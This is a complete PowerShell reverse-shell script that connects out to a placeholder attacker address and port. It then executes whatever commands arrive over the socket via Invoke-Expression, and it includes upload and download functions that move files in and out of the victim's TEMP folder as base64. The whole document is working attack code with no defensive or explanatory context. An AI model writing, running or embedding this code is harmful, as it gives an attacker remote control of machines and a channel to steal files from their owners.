#Remote IP and Port#
$LHOST = "attacker_ip"
$LPORT = port

$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024

#Setting buffer and invoking terminal connection#

while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1)
    }

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try {
            $Command = $Code.Split(" ")[0]
            $Arguments = $Code.Split(" ")[1..($Code.Split(" ").Length - 1)]

            switch ($Command) {
                "execute" {
                    Invoke-Expression (Join-Path $env:windir $Arguments) 2>&1
                }

                #File Upload & Download Functionality#

                "upload" {
                    $FilePath = Join-Path $env:TEMP $Arguments[0]
                    [System.IO.File]::WriteAllBytes($FilePath, [System.Convert]::FromBase64String($Arguments[1]))
                    "File uploaded successfully: $FilePath"
                }
                "download" {
                    $FilePath = Join-Path $env:TEMP $Arguments[0]
                    $FileContent = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes($FilePath))
                    $StreamWriter.Write("download|$Arguments[0]|$FileContent`n")
                }
                default {
                    Invoke-Expression ($Code) 2>&1
                }
            }
        } catch {
            $_
        }

        $StreamWriter.Write("$Output`n")
        $Code = $null
    }
}

$TCPClient.Close()
$NetworkStream.Close()
$StreamReader.Close()
$StreamWriter.Close()
